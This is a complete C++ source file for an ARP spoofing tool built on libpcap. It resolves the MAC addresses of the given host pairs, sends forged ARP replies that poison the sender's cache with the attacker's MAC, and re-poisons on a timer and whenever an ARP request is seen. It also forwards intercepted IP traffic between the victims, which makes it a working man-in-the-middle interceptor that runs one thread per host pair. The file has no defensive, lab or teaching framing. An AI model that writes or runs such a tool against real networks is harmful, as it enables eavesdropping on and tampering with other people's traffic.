#include <pcap.h>
#include <iostream>
#include <vector>
#include <array>
#include <thread>
#include <chrono>
#include <cstring>
#include <stdexcept>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

class MacAddr {
public:
    static constexpr size_t LENGTH = 6;
    MacAddr() { data.fill(0); }
    MacAddr(const uint8_t* bytes) { std::copy(bytes, bytes + LENGTH, data.begin()); }
    static MacAddr broadcast() { return MacAddr(std::array<uint8_t, LENGTH>{0xff,0xff,0xff,0xff,0xff,0xff}.data()); }
    const uint8_t* bytes() const { return data.data(); }
    std::string str() const {
        char buf[18];
        std::snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
                      data[0], data[1], data[2], data[3], data[4], data[5]);
        return std::string(buf);
    }
private:
    std::array<uint8_t, LENGTH> data;
};

// Simple IPv4 wrapper
class IpAddr {
public:
    explicit IpAddr(const std::string& s) {
        if (inet_pton(AF_INET, s.c_str(), &addr) != 1) {
            throw std::runtime_error("Invalid IP: " + s);
        }
    }
    uint32_t toInt() const { return addr; }
private:
    uint32_t addr;
};

#pragma pack(push, 1)
struct EthArpPkt {
    std::array<uint8_t,6> dst;
    std::array<uint8_t,6> src;
    uint16_t ethType;
    uint16_t hwType;
    uint16_t protoType;
    uint8_t hwLen;
    uint8_t protoLen;
    uint16_t opCode;
    std::array<uint8_t,6> arpSrcMac;
    uint32_t arpSrcIp;
    std::array<uint8_t,6> arpDstMac;
    uint32_t arpDstIp;
};
#pragma pack(pop)

class ArpSpoofer {
public:
    ArpSpoofer(std::string iface, std::string sender, std::string target)
        : ifaceName(std::move(iface)), senderIp(std::move(sender)), targetIp(std::move(target)) {
        initCapture();
        fetchLocalMac();
        resolvePeerMac(senderIp, senderMac);
        resolvePeerMac(targetIp, targetMac);
        std::cout << "Device MAC: " << localMac.str() << "\n"
                  << "Sender MAC: " << senderMac.str() << " (" << senderIp << ")\n"
                  << "Target MAC: " << targetMac.str() << " (" << targetIp << ")\n";
        poisonArp();
    }

    void operator()() {
        auto lastTime = std::chrono::steady_clock::now();
        while (true) {
            // periodic re-poisoning every 20s
            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTime).count() >= 20) {
                poisonArp();
                lastTime = now;
            }

            struct pcap_pkthdr* header;
            const u_char* packet;
            int ret = pcap_next_ex(handle, &header, &packet);
            if (ret <= 0) continue;

            EthArpPkt parsed;
            std::memcpy(&parsed, packet, sizeof(parsed));
            uint16_t type = ntohs(parsed.ethType);
            if (type == 0x0806) handleArp(parsed);
            else if (type == 0x0800) handleIp(packet, header->caplen);
        }
    }

private:
    void initCapture() {
        char err[PCAP_ERRBUF_SIZE];
        handle = pcap_open_live(ifaceName.c_str(), BUFSIZ, 1, 1000, err);
        if (!handle) throw std::runtime_error("pcap_open_live error: " + std::string(err));
    }

    void fetchLocalMac() {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) throw std::runtime_error("socket() failure");
        struct ifreq ifr{};
        std::strncpy(ifr.ifr_name, ifaceName.c_str(), IFNAMSIZ - 1);
        if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
            close(fd);
            throw std::runtime_error("ioctl(SIOCGIFHWADDR) failed");
        }
        close(fd);
        localMac = MacAddr(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    }

    void resolvePeerMac(const std::string& ip, MacAddr& outMac) {
        IpAddr t(ip);
        MacAddr broad = MacAddr::broadcast();
        while (true) {
            sendArp(localMac, broad, "0.0.0.0", t);
            struct pcap_pkthdr* hdr;
            const u_char* pkt;
            if (pcap_next_ex(handle, &hdr, &pkt) <= 0) continue;

            EthArpPkt pr;
            std::memcpy(&pr, pkt, sizeof(pr));
            if (ntohs(pr.ethType) != 0x0806 || ntohs(pr.opCode) != 2) continue;
            if (pr.arpSrcIp != htonl(t.toInt())) continue;
            outMac = MacAddr(pr.arpSrcMac.data());
            break;
        }
    }

    void sendArp(const MacAddr& from, const MacAddr& to, const std::string& srcIp, const IpAddr& dst) {
        EthArpPkt p{};
        std::copy(to.bytes(), to.bytes() + 6, p.dst.begin());
        std::copy(from.bytes(), from.bytes() + 6, p.src.begin());
        p.ethType   = htons(0x0806);
        p.hwType    = htons(1);
        p.protoType = htons(0x0800);
        p.hwLen     = 6;
        p.protoLen  = 4;
        p.opCode    = htons(1);
        std::copy(from.bytes(), from.bytes() + 6, p.arpSrcMac.begin());
        p.arpSrcIp  = htonl(IpAddr(srcIp).toInt());
        std::copy(to.bytes(), to.bytes() + 6, p.arpDstMac.begin());
        p.arpDstIp  = htonl(dst.toInt());
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&p), sizeof(p));
    }

    void poisonArp() {
        sendArp(localMac, senderMac, targetIp, IpAddr(senderIp));
    }

    void handleArp(const EthArpPkt& pkt) {
        if (ntohs(pkt.opCode) != 1) return;
        uint32_t sip = ntohl(pkt.arpSrcIp);
        uint32_t tip = ntohl(pkt.arpDstIp);
        if ((sip == IpAddr(senderIp).toInt() && tip == IpAddr(targetIp).toInt()) ||
            (sip == IpAddr(targetIp).toInt() && tip == IpAddr(senderIp).toInt())) {
            poisonArp();
        }
    }

    void handleIp(const u_char* data, size_t len) {
        struct EthHdr { uint8_t dst[6], src[6]; uint16_t type; } eth;
        std::memcpy(&eth, data, sizeof(eth));
        if (std::equal(eth.src, eth.src+6, senderMac.bytes()) &&
            std::equal(eth.dst, eth.dst+6, localMac.bytes())) {
            forward(data, len, targetMac);
        } else if (std::equal(eth.src, eth.src+6, targetMac.bytes()) &&
                   std::equal(eth.dst, eth.dst+6, localMac.bytes())) {
            forward(data, len, senderMac);
        }
    }

    void forward(const u_char* data, size_t len, const MacAddr& dest) {
        std::vector<u_char> buf(len);
        std::memcpy(buf.data(), data, len);
        std::copy(dest.bytes(), dest.bytes()+6, buf.begin());
        std::copy(localMac.bytes(), localMac.bytes()+6, buf.data()+6);
        pcap_sendpacket(handle, buf.data(), len);
    }

    std::string ifaceName;
    std::string senderIp, targetIp;
    MacAddr localMac, senderMac, targetMac;
    pcap_t* handle{nullptr};
};

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        std::cerr << "Usage: " << argv[0]
                  << " <iface> <sender IP> <target IP> [<sender IP2> <target IP2> ...]\n";
        return 1;
    }

    std::string iface = argv[1];
    std::vector<std::thread> pool;
    for (int i = 2; i < argc; i += 2) {
        pool.emplace_back(ArpSpoofer(iface, argv[i], argv[i+1]));
    }
    for (auto& t : pool) t.join();
    return 0;
}
